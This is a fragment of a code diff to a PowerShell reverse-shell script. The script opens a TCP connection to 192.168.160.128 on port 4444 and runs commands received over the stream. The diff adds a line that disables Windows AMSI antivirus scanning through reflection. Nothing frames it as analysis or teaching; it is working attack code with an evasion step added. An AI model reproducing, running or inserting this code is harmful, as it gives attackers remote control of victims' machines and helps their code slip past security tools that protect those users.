@@ -1,3 +1,4 @@
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 $k = "192.168.160.128"; $p = 4444;
 $client = New-Object Net.Sockets.TCPClient($k, $p);
 $stream = $client.GetStream();
@@ -11,7 +12,4 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
     $stream.Flush();
 }
 $client.Close();
-
-
-
 
